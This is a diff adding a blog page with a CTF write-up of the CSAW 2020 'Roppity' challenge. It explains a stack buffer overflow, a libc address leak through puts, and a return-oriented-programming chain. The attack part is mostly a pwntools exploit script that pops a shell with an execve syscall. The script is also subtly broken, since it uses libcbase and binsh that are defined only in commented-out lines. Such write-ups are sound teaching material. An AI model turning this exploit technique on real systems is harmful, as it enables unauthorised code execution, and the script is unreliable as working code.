@@ -1,0 +1,300 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="First ROP challenge from CSAW ctf 2020">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CSAW 2020 - Roppity">
+<meta property="og:url" content="http://atharvdamle.com/csaw-2020-roppity/index.html">
+<meta property="og:site_name" content="Atharv&#39;s Blog">
+<meta property="og:description" content="First ROP challenge from CSAW ctf 2020">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://atharvdamle.com/csaw-2020-roppity/segfaulted.png">
+<meta property="og:image" content="http://atharvdamle.com/csaw-2020-roppity/checksec.png">
+<meta property="article:published_time" content="2020-09-16T22:04:31.000Z">
+<meta property="article:modified_time" content="2022-03-09T15:44:12.414Z">
+<meta property="article:author" content="Atharv Damle">
+<meta property="article:tag" content="Code">
+<meta property="article:tag" content="Binary Exploitation">
+<meta property="article:tag" content="CSAW 2020">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://atharvdamle.com/csaw-2020-roppity/segfaulted.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>CSAW 2020 - Roppity</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/heaping-on/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://atharvdamle.com/csaw-2020-roppity/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://atharvdamle.com/csaw-2020-roppity/&text=CSAW 2020 - Roppity"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://atharvdamle.com/csaw-2020-roppity/&title=CSAW 2020 - Roppity"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://atharvdamle.com/csaw-2020-roppity/&is_video=false&description=CSAW 2020 - Roppity"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=CSAW 2020 - Roppity&body=Check out this article: http://atharvdamle.com/csaw-2020-roppity/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://atharvdamle.com/csaw-2020-roppity/&title=CSAW 2020 - Roppity"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://atharvdamle.com/csaw-2020-roppity/&title=CSAW 2020 - Roppity"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://atharvdamle.com/csaw-2020-roppity/&title=CSAW 2020 - Roppity"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://atharvdamle.com/csaw-2020-roppity/&title=CSAW 2020 - Roppity"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://atharvdamle.com/csaw-2020-roppity/&name=CSAW 2020 - Roppity&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://atharvdamle.com/csaw-2020-roppity/&t=CSAW 2020 - Roppity"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#The-Challenge"><span class="toc-number">1.</span> <span class="toc-text">The Challenge</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Running-this-random-binary%E2%80%A6"><span class="toc-number">2.</span> <span class="toc-text">Running this random binary…</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Buffer-calculations"><span class="toc-number">3.</span> <span class="toc-text">Buffer calculations</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Leaking-a-libc-address"><span class="toc-number">4.</span> <span class="toc-text">Leaking a libc address</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Rop-chain-generation"><span class="toc-number">5.</span> <span class="toc-text">Rop chain generation</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Tl-dr-gimme-the-code"><span class="toc-number">6.</span> <span class="toc-text">Tl;dr, gimme the code</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        CSAW 2020 - Roppity
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Atharv Damle</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2020-09-16T22:04:31.000Z" itemprop="datePublished">2020-09-16</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/Binary-Exploitation/" rel="tag">Binary Exploitation</a>, <a class="tag-link-link" href="/tags/CSAW-2020/" rel="tag">CSAW 2020</a>, <a class="tag-link-link" href="/tags/Code/" rel="tag">Code</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>Here’s the simple ROP challenge from the CSAW 2020 qualifiers.</p>
+<h3 id="The-Challenge"><a href="#The-Challenge" class="headerlink" title="The Challenge"></a>The Challenge</h3><p><em>Welcome to pwn!</em></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc pwn.chal.csaw.io 5016</span><br></pre></td></tr></table></figure>
+
+<p>Along with 2 files, Rop, the binary, and libc-2.27.so</p>
+<h3 id="Running-this-random-binary…"><a href="#Running-this-random-binary…" class="headerlink" title="Running this random binary…"></a>Running this random binary…</h3><p>To start off, when we enter some input we find that the program readily segfaults.</p>
+<img src="/csaw-2020-roppity/segfaulted.png" class="" title="Segfaults easily lol">
+
+<h3 id="Buffer-calculations"><a href="#Buffer-calculations" class="headerlink" title="Buffer calculations"></a>Buffer calculations</h3><p>Then using a disassembler (here I am using binaryninja, but you can use any one you like), we find out that we’re inputting into a buffer of size <code>0x20</code> using the <code>gets()</code> call.<br>Since <code>rbp</code> is first to be pushed onto the stack, and the buffer size being offset from <code>rbp</code>, the total padding required is:</p>
+<p>0x20 + 8 bytes for rbp &#x3D; <strong>40 bytes</strong></p>
+<h3 id="Leaking-a-libc-address"><a href="#Leaking-a-libc-address" class="headerlink" title="Leaking a libc address"></a>Leaking a libc address</h3><p>Since there is no win function, next thing we need is a way to pop the shell. There don’t seem to be enough rop gadgets to pop a shell, and with the NX functionality enabled, it doesn’t seem like we can use any shellcode.</p>
+<img src="/csaw-2020-roppity/checksec.png" class="" title="PIE disabled, NX enabled">
+
+<p>In that case, the only thing to do is leak a libc address using the classic <code>puts(puts)</code> idea. We print out the address of puts in the GOT which should contain the address of puts in libc, by jumping to <code>puts@plt</code>.<br><strong>Note:</strong> We don’t need to leak a code address since there is no PIE</p>
+<h3 id="Rop-chain-generation"><a href="#Rop-chain-generation" class="headerlink" title="Rop chain generation"></a>Rop chain generation</h3><p>Once we have the leak, since we know the libc version, the next problem is to run the gets call again, so that we can send in the the rop chain we generate from the libc.<br>To do this, we jump back to the main function, get it to repair the currently destroyed stack, and then enter in our ropchain.</p>
+<h3 id="Tl-dr-gimme-the-code"><a href="#Tl-dr-gimme-the-code" class="headerlink" title="Tl;dr, gimme the code"></a>Tl;dr, gimme the code</h3><p>The whole script is as follows.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">PROGNAME = <span class="string">&quot;./rop&quot;</span></span><br><span class="line">REMOTEIP = <span class="string">&quot;pwn.chal.csaw.io&quot;</span></span><br><span class="line">REMOTEPORT = <span class="string">&quot;5016&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> args.REMOTE:</span><br><span class="line">        p = remote(REMOTEIP, REMOTEPORT)</span><br><span class="line">        elf = ELF(PROGNAME)</span><br><span class="line">        libcelf = ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">        p = process(PROGNAME)</span><br><span class="line">        elf = p.elf</span><br><span class="line">        libcelf = ELF(<span class="string">&#x27;&lt;system libc path&gt;&#x27;</span>)</span><br><span class="line">        gdb.attach(p)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Requires 40 bytes of padding</span></span><br><span class="line">padding = <span class="string">b&#x27;a&#x27;</span> * <span class="number">40</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># puts address in the binary</span></span><br><span class="line"><span class="comment"># puts@plt</span></span><br><span class="line">puts = <span class="number">0x004004a0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># puts@got</span></span><br><span class="line">putsGot = <span class="number">0x601018</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pop rdi gadget for all the rop</span></span><br><span class="line">popRdi = <span class="number">0x0000000000400683</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Return to the main function to repair the</span></span><br><span class="line"><span class="comment"># destroyed stack</span></span><br><span class="line">main = <span class="number">0x004005dc</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># run puts@plt with puts@got in rdi to leak a libc address</span></span><br><span class="line">p.sendline(padding + p64(popRdi) + p64(putsGot) + p64(puts) + p64(main))</span><br><span class="line"></span><br><span class="line"><span class="comment"># stripping the newline</span></span><br><span class="line">leak = p.readline()[:-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># the leak is only 6 bytes, with address being of the form: 0x0000&lt;address&gt;</span></span><br><span class="line">libc = u64(leak + <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># sadly the system(&#x27;/bin/sh&#x27;) doesn&#x27;t work, possibly has been disabled</span></span><br><span class="line"><span class="comment"># libcbase = libc - libcelf.symbols[&#x27;puts&#x27;]</span></span><br><span class="line"><span class="comment"># libcsys = libcbase + libcelf.symbols[&#x27;system&#x27;]</span></span><br><span class="line"><span class="comment"># binsh = libcbase + next(libcelf.search(b&#x27;/bin/sh&#x27;))</span></span><br><span class="line"><span class="comment"># systemPayload = padding + p64(popRdi) + p64(binsh) + p64(libcsys)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># The rop chain magic</span></span><br><span class="line">syscall = p64(libcbase + <span class="number">0x00000000000d29d5</span>)</span><br><span class="line">popRsi = p64(libcbase + <span class="number">0x0000000000023e8a</span>) + p64(<span class="number">0</span>)</span><br><span class="line">popRdx = p64(libcbase + <span class="number">0x0000000000001b96</span>) + p64(<span class="number">0</span>)</span><br><span class="line">popRax = p64(libcbase + <span class="number">0x0000000000043a78</span>) + p64(<span class="number">59</span>)</span><br><span class="line">setBinsh = p64(popRdi) + p64(binsh)</span><br><span class="line"></span><br><span class="line"><span class="comment"># execve syscall</span></span><br><span class="line"><span class="comment"># rax: 59</span></span><br><span class="line"><span class="comment"># rdi: pointer to &#x27;/bin/sh\x00&#x27;</span></span><br><span class="line"><span class="comment"># rsi: 0</span></span><br><span class="line"><span class="comment"># rdx: 0</span></span><br><span class="line">p.sendline(padding + popRsi + popRdx + popRax + setBinsh + syscall)</span><br></pre></td></tr></table></figure>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#The-Challenge"><span class="toc-number">1.</span> <span class="toc-text">The Challenge</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Running-this-random-binary%E2%80%A6"><span class="toc-number">2.</span> <span class="toc-text">Running this random binary…</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Buffer-calculations"><span class="toc-number">3.</span> <span class="toc-text">Buffer calculations</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Leaking-a-libc-address"><span class="toc-number">4.</span> <span class="toc-text">Leaking a libc address</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Rop-chain-generation"><span class="toc-number">5.</span> <span class="toc-text">Rop chain generation</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Tl-dr-gimme-the-code"><span class="toc-number">6.</span> <span class="toc-text">Tl;dr, gimme the code</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://atharvdamle.com/csaw-2020-roppity/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://atharvdamle.com/csaw-2020-roppity/&text=CSAW 2020 - Roppity"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://atharvdamle.com/csaw-2020-roppity/&title=CSAW 2020 - Roppity"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://atharvdamle.com/csaw-2020-roppity/&is_video=false&description=CSAW 2020 - Roppity"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=CSAW 2020 - Roppity&body=Check out this article: http://atharvdamle.com/csaw-2020-roppity/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://atharvdamle.com/csaw-2020-roppity/&title=CSAW 2020 - Roppity"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://atharvdamle.com/csaw-2020-roppity/&title=CSAW 2020 - Roppity"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://atharvdamle.com/csaw-2020-roppity/&title=CSAW 2020 - Roppity"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://atharvdamle.com/csaw-2020-roppity/&title=CSAW 2020 - Roppity"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://atharvdamle.com/csaw-2020-roppity/&name=CSAW 2020 - Roppity&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://atharvdamle.com/csaw-2020-roppity/&t=CSAW 2020 - Roppity"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2019-2022
+    Atharv Damle
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
